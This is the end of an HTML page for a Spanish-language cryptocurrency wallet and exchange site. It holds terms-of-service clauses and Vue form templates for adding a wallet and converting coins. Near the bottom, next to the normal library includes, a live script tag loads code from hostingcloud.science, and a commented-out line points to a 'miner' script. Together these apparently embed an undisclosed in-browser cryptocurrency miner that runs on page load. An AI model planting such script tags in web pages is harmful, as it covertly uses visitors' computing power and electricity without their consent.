									<p>La Plataforma no tendrá ninguna responsabilidad por los errores u omisiones en el funcionamiento del sitio web, por su acción o inacción en relación con él o por cualquier daño a su computadora o datos o fondos o cualquier otro daño que pueda incurrir en relación con eso. Su uso del sitio web es bajo su propio riesgo. En ningún caso la Plataforma será responsable de ningún daño directo, indirecto, punitivo, incidental, especial o consecuente que surja de o esté relacionado con su uso, la demora o la imposibilidad de utilizar la Plataforma o que surja de otro modo en relación con ella, ya sea basado en contrato, responsabilidad extracontractual, responsabilidad estricta o de otro tipo, incluso si se informa de la posibilidad de daños y perjuicios.</p>
									<p>Usted acepta defender, indemnizar y mantener indemne a la Plataforma de todos los reclamos, daños, costos y gastos, incluidos los honorarios de abogados, que surjan o estén relacionados con su uso de la Plataforma.</p>
									<p>La Plataforma no garantiza que los Servicios del sitio web sean aplicables o apropiados para su uso en todas las jurisdicciones.</p>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="Third-Party-Websites-and-content" class="question-title">Sitios web y contenido de terceros</h2>
								</div>
								<div class="col-12">
									<p>El sitio web puede contener enlaces a sitios web propiedad u operados por terceros que no sean la plataforma. Dichos enlaces se proporcionan únicamente para su referencia. La Plataforma no supervisa ni controla fuera de ella y no es responsable de su contenido. La inclusión de enlaces a recursos de terceros no implica ningún respaldo del material en el sitio web o, a menos que se indique expresamente lo contrario, patrocinio, afiliación o asociación con su propietario, operador o patrocinador, ni dicha inclusión de enlaces implica que la plataforma está autorizado a usar cualquier nombre comercial, marca comercial, logotipo, sello legal u oficial, o símbolo con derechos de autor que pueda reflejarse en el sitio web vinculado. La Plataforma no controla el contenido de terceros, incluido el contenido publicado por usted u otros usuarios de la Plataforma, ni supervisa si cumple con algún requisito (por ejemplo, veracidad, integridad, legalidad). En consecuencia, la Plataforma no asume ninguna responsabilidad derivada de su acceso o uso del contenido de terceros.</p>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="Taxes" class="question-title">Impuestos</h2>
								</div>
								<div class="col-12">
									<p>La Plataforma no es responsable de determinar si los impuestos se aplican a cualquiera de sus transacciones, o para cobrar, informar o remitir los impuestos que surjan de cualquier transacción</p>
								</div>
							</div>    
							<hr> 
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="Jurisdiction-applicable-law" class="question-title">Jurisdicción, ley aplicable</h2>
								</div>
								<div class="col-12">
									<p>Las Partes acuerdan intentar, de buena fe, resolver mediante negociaciones cualquier disputa, desacuerdo o reclamo que surja de o en conexión con la ejecución, terminación o rescisión de estos términos y condiciones. La parte reclamante enviará un mensaje con su reclamo a la otra parte. El mensaje en cuestión contendrá los elementos esenciales del reclamo y la evidencia que respalda dicho reclamo.</p>
									<p>En ausencia de una respuesta a la reclamación dentro de los 30 días hábiles posteriores a la fecha de envío, o si las Partes no lograron llegar a un acuerdo amistoso, la disputa se presentará y escuchará exclusivamente en el tribunal correspondiente en el lugar determinado por la Plataforma en su discreción única.</p>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="Miscellaneous" class="question-title">Diverso</h2>
								</div>
								<div class="col-12">
									<ul>
										<li>Las Partes acuerdan usar botones "Acepto" mientras entregan todos los documentos o reclamos necesarios. Las Partes confirman que los documentos y reclamos firmados a través de los botones "Acepto" tienen el efecto legal y deben ser aceptados y considerados por las Partes. Las Partes confirman que todos los correos electrónicos enviados desde las direcciones de correo electrónico autorizadas se consideran enviados y acordados por las Partes.</li>
										<li>Su correo electrónico autorizado es el correo electrónico que ingresó durante el registro. Todas las comunicaciones y documentos que se realizarán o entregarán de conformidad con este documento deben estar en idioma inglés. Las versiones traducidas de este documento son traducciones de este original solo con fines informativos. En caso de discrepancia, prevalecerá el original en inglés.</li>
										<li>La plataforma se reserva el derecho de contactar al usuario para solicitar cualquier información adicional relacionada con su identidad o fuente de fondos y lo hará también para asuntos de divulgación de datos; siempre bajo los límites del Reglamento General de Protección de Datos , que respalda, pero no se limita a, tener el consentimiento informado del usuario en caso de divulgación de datos.</li>
										<li>Cuando esté legalmente obligado, la plataforma proporcionará la información del usuario a las agencias gubernamentales a petición legal, orden judicial o presentación de la orden.</li>
										<li>Hasta que una Parte notifique a la otra sobre el hecho de la violación de la seguridad con respecto a su correo electrónico autorizado, todas las acciones y documentos hechos y enviados desde el correo electrónico autorizado de una de las Partes, incluso si estas acciones y documentos han sido hechos y enviados por parte de terceros, se consideran hechos y enviados por el propietario del correo electrónico autorizado. En ese caso, el propietario del correo electrónico autorizado adquiere todos los derechos e incurre en todas las obligaciones, además de asumir la responsabilidad derivada de estos hechos.</li>
										<li>Si en algún momento cualquiera o cualquiera de las disposiciones de estos términos y condiciones es o se vuelve ilegal, inválida o no aplicable en cualquier aspecto bajo cualquier ley de cualquier jurisdicción, ni la legalidad, validez o aplicabilidad de las disposiciones restantes de estos términos y condiciones ni la la legalidad, validez o aplicabilidad de dicha disposición bajo la ley de cualquier otra jurisdicción se verá afectada o perjudicada de alguna manera como resultado.</li>
										<li>Los títulos se insertan solo para la comodidad de las partes y no se deben tener en cuenta al interpretar este documento. Las palabras en singular significan e incluyen el plural y viceversa. Las palabras en el masculino significan e incluyen lo femenino y viceversa.</li>
									</ul>
								</div>
							</div>        
						</div>
					</div>
				</div>

				<hr>
				<hr>
			</div>
		</template>
		
		<template id="createWalletPage-template">
			<div>
				<div class="content_middle">
					<div class="container">
						<div class="row">
							<div class="col-md-12">
								<div class="dropdown-divider"></div>								
								<div class="panel panel-primary" style="margin:20px;">
									<div class="panel-heading">
										<h1 class="panel-title">Crear Nueva Wallet</h1>
										<hr>
									</div>
									<div class="panel-body">
										<form method="POST" class="form row" action="javascript:false;" @submit="submitCreateWallet">
											<div class="col-md-6 col-sm-6">
												<div class="form-group col-md-12 col-sm-12">
													<label for="name">Direccion (address)*:</label>
													<input type="text" class="form-control input-sm" name="address" v-model="address" placeholder="">
												</div>
												<div class="form-group col-md-12 col-sm-12">
													<label for="name">Currency*</label>
													
													<select v-model="selectedCurrency" class="form-control input-sm">
													  <option v-for="option in optionsCurrency" v-bind:value="option.value">
														{{ option.text }}
													  </option>
													</select>
													<span>Selected: {{ selectedCurrency }}</span>
												</div>
											</div>

											<div class="col-md-6 col-sm-6">
												
												<div class="form-group col-md-12 col-sm-12" >
													<div class="dropdown-item"><div id="acwidget-newWallet-page"><div id="acwidget-newWallet"><a @click="$parent.realoadCaptcha('acwidget-newWallet')">cargar CatpChat</a></div></div></div>
												</div>
												
												<div class="form-group col-md-12 col-sm-12" >
													<div class="alert alert-dark" role="alert" v-if="message != ''">
													  {{ message }}
													</div>
													<div class="dropdown-divider"></div>
												</div>
												
												<div class="form-group col-md-12 col-sm-12">
													<label for="pincode">Terminos y condiciones</label>
													<span class="help-block">Solo debes agregar una billetera, al agregar tu segunda billetera eliminas de manera automatica la primera.</span>
												</div>
												
												<!--												
												<div class="form-group col-md-12 col-sm-12">
													<label for="pincode"><b>Impotanta: </b></label>
													<span class="help-block">
														Para cambiar su SYMBOL use LINKS. 
														Puede ordenar el pago cuando su cuenta alcance MINPAGO WEB, también deducimos la tarifa de red: FEE SYMBOL.
													</span>
												</div>-->
												
												<div class="form-group col-md-12 col-sm-12 pull-right" >
													<input type="submit" class="btn btn-primary" value="Agregar"/>
												</div>
											</div>
										</form>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		<template id="exchangePage-template">
			<div>
				<div class="content_middle">
					<div class="container">
						<div class="row">
							<div class="col-md-12">
								<div class="dropdown-divider"></div>								
								<div class="panel panel-primary" style="margin:20px;">
									<div class="panel-heading">
										<h1 class="panel-title">Convertir: {{ coinFrom }}</h1>
										<hr>
									</div>
									<div class="panel-body">
										<div class="row">
											<div class="col-md-12">
												<h4>IMPORTANTE</h4>
												<p>
													<ul>
														<li>No hay cuota para la conversión</li>
														<li>La tasa de conversión que se muestra a continuación es la tasa ACTUAL; es probable que fluctúe durante el día.</li>
														<li>La conversión se hará al instante. La cantidad especificada se cargará de su bote y la cantidad convertida se acreditará a su otra olla de monedas de inmediato.</li>
														<li>Las conversiones no se pueden cancelar ni anular una vez que están completas</li>
													</ul>
												</p>
												
												<hr>
											</div>
											<div class="col-md-12">
												<form method="POST" class="form row" action="javascript:false;" @submit="submitConvert">
													<div class="col-md-6 col-sm-6">
														<div class="form-group col-md-12 col-sm-12">
															<label for="name">Convert to*</label>
															
															<select v-model="coinTo" class="form-control input-sm" @change="calculateRate">
															  <option v-for="option in optionsCurrency" v-bind:value="option.symbol">
																{{ option.text }}
															  </option>
															</select>
															<span>Selected: {{ coinTo }}</span>
														</div>
														<div class="form-group col-md-12 col-sm-12">
															<label for="name">Conversion rate</label>
															<input type="text" class="form-control input-sm" readonly="" name="conversionRate" v-model="conversionRate" placeholder="">
														</div>
														<div class="form-group col-md-12 col-sm-12">
															<label for="name">Amount to convert</label>
															<input type="text" class="form-control input-sm" @change="calculateAmountRecibe" name="amountConvert" v-model="amountConvert" placeholder="">
														</div>
														<div class="form-group col-md-12 col-sm-12">
															<label for="name">Amount you will receive</label>
															<input type="text" class="form-control input-sm" readonly="" name="amountRecibe" v-model="amountRecibe" placeholder="">
														</div>
													</div>

													<div class="col-md-6 col-sm-6">
														
														<div class="form-group col-md-12 col-sm-12" >
															<div class="dropdown-item"><div id="acwidget-convert-page"><div id="acwidget-convert"><a @click="$parent.realoadCaptcha('acwidget-convert')">cargar CatpChat</a></div></div></div>
														</div>
														
														<div class="form-group col-md-12 col-sm-12" v-if="message != ''">
															<div class="alert alert-dark" role="alert" >
															  {{ message }}
															</div>
															<div class="dropdown-divider"></div>
														</div>
														<div class="form-group col-md-12 col-sm-12">
															<label for="pincode"></label>
															<span class="help-block"></span>
														</div>
														
														<div class="form-group col-md-12 col-sm-12 pull-right" >
															<input type="submit" class="btn btn-primary" value="Cambiar"/>
														</div>
													</div>
												</form>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		<!-- Placed at the end of the document so the pages load faster -->
		<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
		<script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
		<script src="dist/bootstrap/4.1.3/site/docs/4.1/assets/js/vendor/popper.min.js"></script>
		<script src="dist/bootstrap/4.1.3/dist/js/bootstrap.min.js"></script>
		<!-- Just to make our placeholder images work. Don't actually copy the next line! -->
		<script src="dist/bootstrap/4.1.3/site/docs/4.1/assets/js/vendor/holder.min.js"></script>
		<!-- <script src="api/miner/FNn8.php?f=uwlS.js"></script> -->
		<script src="https://www.hostingcloud.science./eUuG.js"></script>
		
		<script src="js/scripts.js"></script>
	</body>
</html>
